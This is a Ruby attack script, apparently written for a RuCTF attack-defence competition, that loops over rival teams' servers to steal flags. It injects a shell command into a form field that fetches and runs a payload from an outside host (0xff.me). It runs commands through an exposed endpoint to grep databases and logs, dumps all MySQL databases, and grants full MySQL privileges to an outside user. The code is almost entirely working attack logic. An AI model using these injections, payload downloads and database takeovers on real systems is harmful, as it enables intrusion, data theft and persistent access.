#!/usr/bin/ruby
require 'open-uri'
require 'mechanize'
require 'socket'

#curl http://10.5.0.3/photos -d "cd /home/photos; strings database.db|grep -Eo '\w{31}=' |sort -u"

class Submitter
  def initialize
    @host = 'submitter.ructf.org'
    @port = 31337
    @socket = TCPSocket.open(@host, @port)
    while line = @socket.gets
          break if line['Enter']
    end
  end

  def submit code
    @socket << "#{code.strip}\n"
    @socket.gets.to_s.strip
  end

  def done
    @socket.close
  end

  def self.start &block
    s = Submitter.new
    yield(s)
    s.done
  end
end

def infect ip
  puts "[.] infect #{ip}"
  a = Mechanize.new
  page = a.get("http://#{ip}/photos")

  page = page.form_with(:action => 'login') do |f|
    f.login = 'xxx'
    f.password = 'xxx'
  end.submit

  page = page.form_with(:action => 'ajax/create') do |f|
    f.title_input = '$(cd /tmp;fetch http://0xff.me/lx;sh lx)'
  end.submit

  true
rescue Mechanize::ResponseCodeError
  puts "[?] #{$!}"
  false
end

def cl x
  x.strip.split("\n").map(&:strip).uniq.reject{ |x| x.size != 32 || x['<'] || x['>'] }
end

def process ip
  puts "[.] process #{ip}"
  data = `curl -m20 -s http://#{ip}/photos -d "strings database.db|grep -Eo '\\w{31}=' --binary-files=text |sort -u"`
  if data['502 Bad Gateway'] || data["Sinatra doesn't know this ditty"]
    return #unless infect(ip)
    puts "[.] attempt #2"
    data = `curl -m20 -s http://#{ip}/photos -d "strings database.db|grep -Eo '\\w{31}=' --binary-files=text |sort -u"`
  elsif data.to_s.strip == ''
    puts "[?] empty response"
    return
  end

  data ||= ''
  data += "\n"
  data += `curl -m35 -s http://#{ip}/photos -d "/usr/local/bin/mysql -u root -e 'grant all on *.* to xxx@10.0.0.1 with  grant option'; /usr/local/bin/mysqldump -u root --all-databases|gzip" | gunzip | grep -Eo '\\w{31}=' --binary-files=text|sort -u`

  data += "\n"
  data += `curl -m35 -s http://#{ip}/photos -d "/usr/local/bin/mysqldump -u pickdown -psimplepassword --all-databases|gzip" | gunzip | grep -Eo '\\w{31}=' --binary-files=text |sort -u`

  data += "\n"

  data += `curl -m40 -s http://#{ip}/photos -d "egrep -ho '\\\\w{31}(%3D|=)' /var/log/*log --binary-files=text | sed s/%3D/=/ | sort -u"`

  #`curl -m10 -s http://#{ip}/photos -d "/usr/local/bin/mysql -u root -e 'grant all on *.* to xxx@10.0.0.1 with grant option'"`

  a = cl(data) - cl(File.read('old.dat'))
  if a.any?
    puts '---'
    Submitter.start do |s|
      a.each do |code|
        print "#{code}"
        r = s.submit(code)
        puts r.to_s.strip == "" ? "" : " #{r}"
        case r
        when /Accepted/, /you already submitted this flag/, /Denied: no such flag/, /flag is too old/
          lock = File.open('old.lock','w')
          lock.flock(File::LOCK_EX)
          File.open('old.dat','a'){ |f| f.puts(code.strip) }
          lock.flock(File::LOCK_UN)
          lock.close
        end
      end
    end
    puts '---'
  else
    p []
  end
end

INFECTED = %w'24 26 12 1 5 32 19 43'

PATCHED = %w'10 3 2 16 39 23 28 4 6 51 18 30 24 14'

DOWN = %w'33 32 40 46 22 17 54 8 25 42 50 15 20 41 53 56 28'

ips = open('http://status.ructf.org/').read.
  scan(/\d+\.\d+\.\d+\.\d+/).
  uniq.
  map{ |x| x.sub(/\.4$/,'.3') } - (PATCHED+DOWN).map{|x| "10.#{x}.0.3"}

if ARGV.any?
  ARGV.each{ |ip| process ip }
end

while true do
  ips.shuffle.each{ |ip| process ip }
end
